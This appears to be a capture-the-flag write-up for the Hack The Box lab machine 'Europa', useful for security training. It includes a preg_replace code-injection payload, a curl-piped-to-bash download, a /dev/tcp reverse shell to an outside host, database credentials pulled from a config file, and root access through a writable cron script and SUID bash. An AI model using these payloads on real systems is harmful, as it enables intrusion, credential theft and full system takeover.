---
layout: default
---

# Europa

# Enumeration

IP → 10.10.10.22

Port scan reported the following opened ports.

```bash
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack
80/tcp  open  http    syn-ack
443/tcp open  https   syn-ack
```

```bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6b:55:42:0a:f7:06:8c:67:c0:e2:5c:05:db:09:fb:78 (RSA)
|   256 b1:ea:5e:c4:1c:0a:96:9e:93:db:1d:ad:22:50:74:75 (ECDSA)
|_  256 33:1f:16:8d:c0:24:78:5f:5b:f5:6d:7f:f7:b4:f2:e5 (ED25519)
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=europacorp.htb/organizationName=EuropaCorp Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb
| Not valid before: 2017-04-19T09:06:22
|_Not valid after:  2027-04-17T09:06:22
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- No UDP

### Port 80/443

### Headers

```bash
┌──(kali㉿kali)-[~/machines/linux/europa]
└─$ curl -I 10.10.10.22                     
HTTP/1.1 200 OK
Date: Fri, 01 Dec 2023 17:20:56 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 26 Jul 2017 22:36:04 GMT
ETag: "30a7-5554012ba5aba"
Accept-Ranges: bytes
Content-Length: 12455
Vary: Accept-Encoding
Content-Type: text/html
```

```bash
┌──(kali㉿kali)-[~/machines/linux/europa]
└─$ curl -k -I https://10.10.10.22:443
HTTP/1.1 200 OK
Date: Fri, 01 Dec 2023 17:21:29 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 26 Jul 2017 22:36:04 GMT
ETag: "30a7-5554012ba5aba"
Accept-Ranges: bytes
Content-Length: 12455
Vary: Accept-Encoding
Content-Type: text/html
```

We have and admin panel at `https://admin-portal.europacorp.htb/login.php` but don’t seem to be functional.

## admin-portal.europacorp.htb

Testing common injections we bypass the loggin panel.

There is an utility to create openvpn files. If we how the petition is send to the server we notice that regular expressions are being used

```bash
pattern=%2Fip_address%2F&ipaddress=10.10.14.5
```

# Foothold

### Testing a code injection

If we search for common regular expressions RCE in php we will find this blog [https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4](https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4) where we can see how to trigger a RCE when preg_replace is used.

```bash
pattern=%2Fa%2Fe&ipaddress=phpinfo()<SNIP>
```

Sending this request we will see the `phpinfo()` page, so we are executing php code.

### Gaining remote access

Sending the next request will give us a shell.

```bash
pattern=%2Fa%2Fe&ipaddress=system('curl+10.10.14.5/rev.sh|bash')<SNIP>
```

```bash
┌──(kali㉿kali)-[~/machines/linux/europa]
└─$ cat rev.sh              
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.14.5/443 0>&1"
```

```bash
┌──(kali㉿kali)-[~/machines/linux/europa]
└─$ nc -lvnp 443                    
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.22] 55616
bash: cannot set terminal process group (1441): Inappropriate ioctl for device
bash: no job control in this shell
www-data@europa:/var/www/admin$ whoami
whoami
www-data
```

# Privilege escalation

### Users in the machine

```bash
root:x:0:0:root:/root:/bin/bash
john:x:1000:1000:John Makris,,,:/home/john:/bin/bash
```

### DB inspection

We can see a password in the db.php file.

```bash
www-data@europa:/var/www/admin$ cat db.php 
<?php
$connection = mysqli_connect('localhost', 'john', 'iEOERHRiDnwkdnw');
if (!$connection){
die("Database Connection Failed" . mysqli_error($connection));
}
$select_db = mysqli_select_db($connection, 'admin');
if (!$select_db){
die("Database Selection Failed" . mysqli_error($connection));
}
```

Inital access to database.

```bash
www-data@europa:/var/www/admin$ mysql -ujohn -piEOERHRiDnwkdnw
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 61891
Server version: 5.7.18-0ubuntu0.16.04.1 (Ubuntu)

mysql> show tables
    -> ;
ERROR 1046 (3D000): No database selected
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| admin              |
+--------------------+
```

We have some md5 passwords from the database but we cannot crack them.

```bash
mysql> show tables;
+-----------------+
| Tables_in_admin |
+-----------------+
| users           |
+-----------------+
1 row in set (0.00 sec)

mysql> select * from users;
+----+---------------+----------------------+----------------------------------+--------+
| id | username      | email                | password                         | active |
+----+---------------+----------------------+----------------------------------+--------+
|  1 | administrator | admin@europacorp.htb | 2b6d315337f18617ba18922c0b9597ff |      1 |
|  2 | john          | john@europacorp.htb  | 2b6d315337f18617ba18922c0b9597ff |      1 |
+----+---------------+----------------------+----------------------------------+--------+
```

### Strange cron files /var/www/

In /var/www we can see some kind of cronjob

```bash
www-data@europa:/var/www/cronjobs$ ls -la           
total 12
drwxr-xr-x 2 root root 4096 Jun 23  2017 .
drwxr-xr-x 6 root root 4096 May 17  2022 ..
-r-xr-xr-x 1 root root  1find 32 May 12  2017 clearlogs
www-data@europa:/var/www/cronjobs$ cat clearlogs 
#!/usr/bin/php
<?php
$file = '/var/www/admin/logs/access.log';
file_put_contents($file, '');
exec('/var/www/cmd/logcleared.sh');
?>
```

```bash
www-data@europa:/var/www/cmd$ ls -la
total 8
drwxrwxr-x 2 root www-data 4096 May 17  2022 .
drwxr-xr-x 6 root root     4096 May 17  2022 ..
```

Lets write the a file called `logcleared.sh` and see of something is executed

```bash
www-data@europa:/var/www/cmd$ cat logcleared.sh 
#!/bin/sh

echo "test" > /tmp/pwn
```

If we check **tmp** file we can see that root has executed the script. Let’s escalate privileges finally.

```bash
www-data@europa:/var/www/cmd$ cat logcleared.sh 
#!/bin/sh

chmod u+s /bin/bash
```

```bash
www-data@europa:/var/www/cmd$ ls -la /bin/bash 
-rwsr-xr-x 1 root root 1037528 May 16  2017 /bin/bash
```

Bash is SUID and we can executed as root

```bash
www-data@europa:/var/www/cmd$ bash -p
bash-4.3# whoami
root
```